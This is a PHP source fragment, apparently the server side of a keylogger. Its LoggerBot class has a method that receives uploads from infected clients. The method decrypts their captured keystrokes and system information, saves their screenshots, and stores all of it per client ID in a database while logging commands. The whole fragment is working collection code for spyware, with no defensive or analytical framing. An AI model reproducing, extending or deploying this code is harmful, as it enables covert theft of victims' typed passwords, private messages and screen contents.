<?php

class LoggerBot
{

    private function handleUploadData($data)
    {
        try {
            $this->logWebhook("Upload data: " . json_encode($data) . ", FILES: " . json_encode($_FILES));

            $clientId = $data['client_id'] ?? null;
            if (!$clientId) {
                $this->logError("Upload data failed: Missing client_id");
                http_response_code(400);
                return ['error' => 'Missing client_id'];
            }

            $keystrokes = '';
            if (isset($data['keystrokes']) && !empty($data['keystrokes'])) {
                $this->logWebhook("Received keystrokes for client_id: $clientId, data: " . substr($data['keystrokes'], 0, 50) . "...");
                $keystrokes = $this->decrypt($data['keystrokes']);
                if ($keystrokes === '') {
                    $this->logError("Keystrokes decryption failed or empty for client_id: $clientId");
                } else {
                    $this->logWebhook("Decrypted keystrokes for client_id: $clientId, length: " . strlen($keystrokes));
                }
            } else {
                $this->logWebhook("No keystrokes provided for client_id: $clientId");
            }

            $systemInfo = '';
            if (isset($data['system_info']) && !empty($data['system_info'])) {
                $this->logWebhook("Received system_info for client_id: $clientId, data: " . substr($data['system_info'], 0, 50) . "...");
                $systemInfo = $this->decrypt($data['system_info']);
                if ($systemInfo === '') {
                    $this->logError("System_info decryption failed or empty for client_id: $clientId");
                } else {
                    $jsonCheck = json_decode($systemInfo, true);
                    if (json_last_error() !== JSON_ERROR_NONE) {
                        $this->logError("System_info is not valid JSON for client_id: $clientId, data: " . substr($systemInfo, 0, 50) . "...");
                        $systemInfo = '';
                    } else {
                        $this->logWebhook("Decrypted system_info for client_id: $clientId, length: " . strlen($systemInfo));
                    }
                }
            } else {
                $this->logWebhook("No system_info provided for client_id: $clientId");
            }

            $screenshotPath = null;
            if (isset($_FILES['screenshot']) && $_FILES['screenshot']['error'] === UPLOAD_ERR_OK) {
                $filename = 'screenshot_' . $clientId . '_' . time() . '.png';
                $screenshotPath = Config::$SCREENSHOT_DIR . $filename;
                if (!move_uploaded_file($_FILES['screenshot']['tmp_name'], $screenshotPath)) {
                    $this->logError("Failed to save screenshot for client_id: $clientId");
                    $screenshotPath = null;
                } else {
                    $this->logWebhook("Saved screenshot for client_id: $clientId at $screenshotPath");
                }
            } else {
                $this->logWebhook("No screenshot provided or upload error for client_id: $clientId");
            }

            try {
                $stmt = $this->pdo->prepare(
                    "INSERT INTO user_data (client_id, keystrokes, system_info, screenshot_path, created_at) 
                VALUES (?, ?, ?, ?, NOW())"
                );
                $stmt->execute([$clientId, $keystrokes, $systemInfo, $screenshotPath]);
                $this->logWebhook("Inserted user_data for client_id: $clientId, keystrokes_len: " . strlen($keystrokes) . ", system_info_len: " . strlen($systemInfo));
            } catch (PDOException $e) {
                $this->logError("Database insertion failed for client_id: $clientId, error: " . $e->getMessage());
                throw new Exception("Database insertion failed: " . $e->getMessage());
            }

            $this->logCommand($clientId, 'upload_data', "Keystrokes: " . strlen($keystrokes) . " chars, System Info: " . strlen($systemInfo));

            return ['status' => 'success'];
        } catch (Exception $e) {
            $this->logError("Upload data failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }
}
